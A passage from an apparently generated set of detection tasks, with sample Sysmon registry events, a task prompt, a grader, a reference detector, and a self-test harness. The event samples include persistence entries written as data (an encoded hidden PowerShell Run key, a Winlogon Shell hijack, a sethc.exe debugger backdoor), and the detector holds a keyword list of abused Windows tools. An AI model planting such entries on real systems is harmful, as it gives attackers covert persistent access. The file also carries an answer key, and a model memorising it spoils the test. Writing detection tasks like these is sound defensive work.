    return any(t in c for t in TOK)
PY
''')

# ---------------------------------------------------------------------------
# 12. Registry Run-key / autostart persistence (Sysmon EID 13)
# ---------------------------------------------------------------------------
T("det_registry_run_persist", "registry-persistence",
r'''python3 - <<'PY'
import json
recs=[
 {"id":"m1","EventID":13,"TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater","Details":"powershell -w hidden -enc SQBFAFgA"},
 {"id":"m2","EventID":13,"TargetObject":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive","Details":"C:\\Users\\me\\AppData\\Local\\Temp\\a.vbs"},
 {"id":"m3","EventID":13,"TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell","Details":"explorer.exe,C:\\Users\\Public\\x.exe"},
 {"id":"m4","EventID":13,"TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger","Details":"C:\\Windows\\System32\\cmd.exe"},
 {"id":"b1","EventID":13,"TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth","Details":"C:\\Program Files\\Windows Defender\\MSASCuiL.exe"},
 {"id":"b2","EventID":13,"TargetObject":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Steam","Details":"\"C:\\Program Files (x86)\\Steam\\steam.exe\" -silent"},
 {"id":"b3","EventID":13,"TargetObject":"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings","Details":"binary"},
 {"id":"b4","EventID":13,"TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Dropbox","Details":"C:\\Program Files\\Dropbox\\Client\\Dropbox.exe /systemstartup"},
]
open("events.jsonl","w").write("\n".join(json.dumps(r) for r in recs)+"\n")
PY
''',
"events.jsonl holds Sysmon EventID 13 (registry value set) records {TargetObject,Details}. "
"Write $W/detector.py exposing def detect(event) -> bool that flags autostart persistence: an "
"Image File Execution Options ...\\Debugger value; a Winlogon\\Shell modification; or a "
"Run/RunOnce value whose Details point to a suspicious payload (powershell, -enc, a Temp / "
"AppData\\Local\\Temp path, mshta/wscript/cscript/rundll32/regsvr32, .vbs/.js/.hta, "
"\\Users\\Public\\, cmd /c, bitsadmin, certutil). Do not flag Run entries pointing to a normal "
"Program Files executable, or writes to unrelated keys. The grader compares the exact set of "
"flagged ids.",
r'''python3 - <<'PY'
import json,sys
exp={"m1","m2","m3","m4"}
try:
    import detector
    events=[json.loads(l) for l in open("events.jsonl") if l.strip()]
    flagged=set()
    for e in events:
        try:
            if detector.detect(e): flagged.add(e["id"])
        except Exception as ex:
            print("FAIL: detect() raised on %s: %s"%(e.get("id"),ex)); sys.exit(0)
except Exception as ex:
    print("FAIL: %s"%ex); sys.exit(0)
print("PASS" if flagged==exp else "FAIL: got=%s exp=%s"%(sorted(flagged),sorted(exp)))
PY
''',
r'''cat > detector.py <<'PY'
SUS=("powershell","-enc","\\temp\\","appdata\\local\\temp","mshta","wscript","cscript",
     "rundll32","regsvr32",".vbs",".js",".hta","\\users\\public\\","cmd /c","cmd.exe /c",
     "bitsadmin","certutil")
def detect(e):
    low=(e.get("TargetObject","") or "").lower()
    det=(e.get("Details","") or "").lower()
    if "image file execution options" in low and low.endswith("\\debugger"): return True
    if low.endswith("\\winlogon\\shell"): return True
    if "\\currentversion\\run\\" in low or "\\currentversion\\runonce\\" in low:
        return any(s in det for s in SUS)
    return False
PY
''')

# ===========================================================================
# Self-test harness
# ===========================================================================
def run(script, W):
    return subprocess.run(["bash","-c",script], env={**os.environ,"W":W},
                          capture_output=True, text=True)

def self_test(task):
    base=tempfile.mkdtemp(prefix="dettest_")
    W=os.path.join(base,"w")
    os.makedirs(W)
    try:
        r=run(task["setup_sh"],W)
        if r.returncode!=0:
            return False,"setup failed: "+r.stderr.strip()
        # (a) empty detector must NOT pass
        open(os.path.join(W,"detector.py"),"w").write("")
        r=run(task["grader_sh"],W)
        empty_out=r.stdout.strip()
        if empty_out.startswith("PASS"):
            return False,"empty detector PASSed: "+empty_out
        # (b) reference detector MUST pass
        r=run(task["reference_solution_sh"],W)
        if r.returncode!=0:
            return False,"reference failed: "+r.stderr.strip()
        r=run(task["grader_sh"],W)
        ref_out=r.stdout.strip()
        if ref_out!="PASS":
            return False,"reference did not PASS: "+ref_out+" | "+r.stderr.strip()
        return True,"empty=[%s] ref=[PASS]"%empty_out
    finally:
        shutil.rmtree(base,ignore_errors=True)

def main():
    passed=[]
    for t in TASKS:
        ok,msg=self_test(t)
        print(("OK  " if ok else "BAD ")+t["id"]+" :: "+msg)
        if ok:
            t["self_test_passed"]=True
            passed.append(t)
    out="/private/tmp/claude-503/-Users-flash-gb10/9698b8ec-be3d-495b-98d5-10e0b424bba5/scratchpad/tasks_detection.json"
    json.dump({"tasks":passed}, open(out,"w"), indent=1)
    print("\n%d/%d passed -> %s"%(len(passed),len(TASKS),out))

if __name__=="__main__":
    main()
